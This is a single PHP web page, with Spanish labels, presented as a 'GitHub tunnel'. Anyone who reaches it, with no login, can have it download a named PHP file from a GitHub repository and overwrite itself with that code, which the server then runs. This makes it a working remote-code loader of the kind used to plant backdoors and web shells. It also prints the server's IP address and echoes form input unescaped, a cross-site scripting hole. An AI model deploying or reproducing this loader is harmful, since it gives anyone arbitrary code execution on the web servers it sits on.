<?php
// =====================================================
// 🌐 TÚNEL CONEXIÓN DIRECTA A GITHUB — SIN DESCARGAS
// Reemplaza este mismo archivo desde GitHub al activar
// =====================================================

$mensaje = "";
$pasos = [];
$ip_servidor = $_SERVER['SERVER_ADDR'] ?? '0.0.0.0';
$url_actual = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['archivo_github'])) {
    
    $nombre_archivo = trim($_POST['archivo_github']);
    $usuario_repo = trim($_POST['usuario_repo']);
    $rama = trim($_POST['rama']) ?: 'main';
    
    $pasos[] = "📍 IP del servidor: <strong>$ip_servidor</strong>";
    $pasos[] = "🔗 Conectando con GitHub...";
    $pasos[] = "📦 Repositorio: $usuario_repo";
    $pasos[] = "📄 Archivo objetivo: $nombre_archivo";
    
    // Construir URL directa de GitHub
    $url_github = "https://raw.githubusercontent.com/{$usuario_repo}/{$rama}/{$nombre_archivo}";
    $pasos[] = "🌐 Conectando a: " . htmlspecialchars($url_github);
    
    // Usar stream_context para conexión segura SSL
    $contexto = stream_context_create([
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);
    
    // Obtener contenido DIRECTO en memoria — SIN guardar en disco
    $codigo_nuevo = @file_get_contents($url_github, false, $contexto);
    
    if ($codigo_nuevo === false) {
        // Intentar con rama "master" si falló
        $url_github = "https://raw.githubusercontent.com/{$usuario_repo}/master/{$nombre_archivo}";
        $codigo_nuevo = @file_get_contents($url_github, false, $contexto);
    }
    
    if ($codigo_nuevo === false) {
        $mensaje = "<div class='error'>❌ No se pudo conectar. Verifica el nombre del archivo, usuario y rama.</div>";
        $pasos[] = "❌ Error de conexión: Archivo no encontrado";
    } else {
        $pasos[] = "✅ Túnel establecido — Datos recibidos (" . strlen($codigo_nuevo) . " bytes)";
        $pasos[] = "🔑 Verificando integridad...";
        
        // Verificar que sea código PHP válido
        if (strpos(trim($codigo_nuevo), '<?php') !== 0) {
            $mensaje = "<div class='error'>⚠️ El archivo no contiene código PHP válido.</div>";
            $pasos[] = "⚠️ Advertencia: El archivo no inicia con &lt;?php";
        } else {
            $pasos[] = "✅ Código verificado — Reemplazando archivo...";
            
            // ESCRIBIR sobre este mismo archivo
            $resultado = file_put_contents(__FILE__, $codigo_nuevo);
            
            if ($resultado !== false) {
                $mensaje = "<div class='exito'>✅ <strong>¡ACTIVADO!</strong> Archivo reemplazado correctamente.<br>Redirigiendo en 3 segundos...</div>";
                $pasos[] = "✅ Archivo reemplazado — $resultado bytes escritos";
                $pasos[] = "🔄 Recargando...";
                echo "<script>setTimeout(()=>location.reload(), 3000);</script>";
            } else {
                $mensaje = "<div class='error'>❌ No se pudo escribir. Revisa permisos del archivo.</div>";
                $pasos[] = "❌ Error: Sin permisos de escritura";
            }
        }
    }
}
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌐 Túnel GitHub — Conexión Directa</title>
    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body{
            background: radial-gradient(ellipse at center, #0f0c29 0%, #302b63 35%, #24243e 60%, #000 100%);
            min-height:100vh;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            color:#fff;
            overflow-x:hidden;
            padding:20px;
        }

        /* ====== BARRA DE IP ====== */
        .ip-bar{
            position:fixed;
            top:0;
            left:0;
            right:0;
            background:rgba(0,0,0,0.7);
            padding:10px 20px;
            text-align:center;
            font-family:monospace;
            font-size:14px;
            color:#00ff88;
            border-bottom:1px solid #00ff8844;
            z-index:100;
        }

        /* ====== CONTENEDOR DEL TÚNEL ====== */
        .tunel-container{
            position:relative;
            width:300px;
            height:300px;
            margin-bottom:30px;
            perspective:500px;
        }

        .espiral{
            position:absolute;
            width:100%;
            height:100%;
            border-radius:50%;
            border:2px solid transparent;
            border-top-color:#7c3aed;
            border-bottom-color:#06b6d4;
            animation: girar 4s linear infinite;
            box-shadow:0 0 20px #7c3aed88, inset 0 0 20px #06b6d444;
        }

        .espiral:nth-child(2){
            width:80%;
            height:80%;
            top:10%;
            left:10%;
            animation-duration:3s;
            animation-direction:reverse;
            border-top-color:#06b6d4;
            border-bottom-color:#7c3aed;
        }

        .espiral:nth-child(3){
            width:60%;
            height:60%;
            top:20%;
            left:20%;
            animation-duration:2.5s;
            border-top-color:#a855f7;
            border-bottom-color:#22d3ee;
        }

        .espiral:nth-child(4){
            width:40%;
            height:40%;
            top:30%;
            left:30%;
            animation-duration:2s;
            animation-direction:reverse;
            border-top-color:#c084fc;
            border-bottom-color:#67e8f9;
        }

        .centro-luz{
            position:absolute;
            width:20%;
            height:20%;
            top:40%;
            left:40%;
            background:radial-gradient(circle, #fff 0%, #00ff88 30%, #00ff8800 70%);
            border-radius:50%;
            animation: pulsar 1.5s ease-in-out infinite;
            box-shadow:0 0 60px #00ff88;
            z-index:10;
        }

        @keyframes girar{
            0%{ transform: rotateX(60deg) rotateZ(0deg); }
            100%{ transform: rotateX(60deg) rotateZ(360deg); }
        }

        @keyframes pulsar{
            0%, 100%{ opacity:0.8; transform: scale(1); }
            50%{ opacity:1; transform: scale(1.2); }
        }

        /* ====== FORMULARIO ====== */
        .card{
            background:rgba(255,255,255,0.05);
            backdrop-filter:blur(10px);
            padding:30px;
            border-radius:20px;
            border:1px solid #ffffff22;
            width:100%;
            max-width:450px;
            box-shadow:0 8px 32px rgba(0,0,0,0.3);
        }

        h2{
            text-align:center;
            margin-bottom:25px;
            color:#00ff88;
            font-size:20px;
        }

        label{
            display:block;
            margin-bottom:8px;
            font-size:14px;
            color:#ccc;
        }

        input{
            width:100%;
            padding:12px 15px;
            margin-bottom:20px;
            background:rgba(0,0,0,0.4);
            border:1px solid #7c3aed66;
            border-radius:8px;
            color:#fff;
            font-size:14px;
            outline:none;
            transition:border 0.3s;
        }

        input:focus{
            border-color:#00ff88;
        }

        button{
            width:100%;
            padding:14px;
            background:linear-gradient(90deg, #7c3aed, #06b6d4);
            border:none;
            border-radius:8px;
            color:#fff;
            font-size:16px;
            font-weight:600;
            cursor:pointer;
            transition:transform 0.2s, box-shadow 0.2s;
        }

        button:hover{
            transform:scale(1.02);
            box-shadow:0 0 25px #7c3aed88;
        }

        .mensaje{
            margin-top:20px;
        }

        .exito{
            background:rgba(0,255,136,0.1);
            border:1px solid #00ff88;
            padding:15px;
            border-radius:8px;
            color:#00ff88;
            text-align:center;
        }

        .error{
            background:rgba(255,68,68,0.1);
            border:1px solid #ff4444;
            padding:15px;
            border-radius:8px;
            color:#ff4444;
            text-align:center;
        }

        .log{
            margin-top:20px;
            background:rgba(0,0,0,0.5);
            padding:15px;
            border-radius:8px;
            font-family:monospace;
            font-size:12px;
            color:#aaa;
            max-height:200px;
            overflow-y:auto;
            line-height:1.8;
        }

        .log strong{ color:#00ff88; }
    </style>
</head>
<body>

    <div class="ip-bar">
        📍 IP: <strong><?php echo htmlspecialchars($ip_servidor); ?></strong>
        &nbsp;|&nbsp;
        🌐 URL: <strong style="font-size:12px;"><?php echo htmlspecialchars($url_actual); ?></strong>
    </div>

    <div style="margin-top:60px;"></div>

    <div class="tunel-container">
        <div class="espiral"></div>
        <div class="espiral"></div>
        <div class="espiral"></div>
        <div class="espiral"></div>
        <div class="centro-luz"></div>
    </div>

    <div class="card">
        <h2>🌐 TÚNEL DE CONEXIÓN — GITHUB</h2>

        <form method="post">
            <label>👤 Usuario / Repositorio</label>
            <input type="text" name="usuario_repo" placeholder="ej: miusuario/mirepositorio" required>

            <label>📄 Nombre del archivo (en el repo)</label>
            <input type="text" name="archivo_github" placeholder="ej: miarchivo.php" required>

            <label>🌿 Rama (dejar vacío para "main")</label>
            <input type="text" name="rama" placeholder="main" value="main">

            <button type="submit">⚡ ESTABLECER TÚNEL Y ACTIVAR</button>
        </form>

        <div class="mensaje"><?php echo $mensaje; ?></div>

        <?php if (!empty($pasos)): ?>
        <div class="log">
            <?php foreach ($pasos as $p): ?>
                <div><?php echo $p; ?></div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
    </div>

</body>
</html>
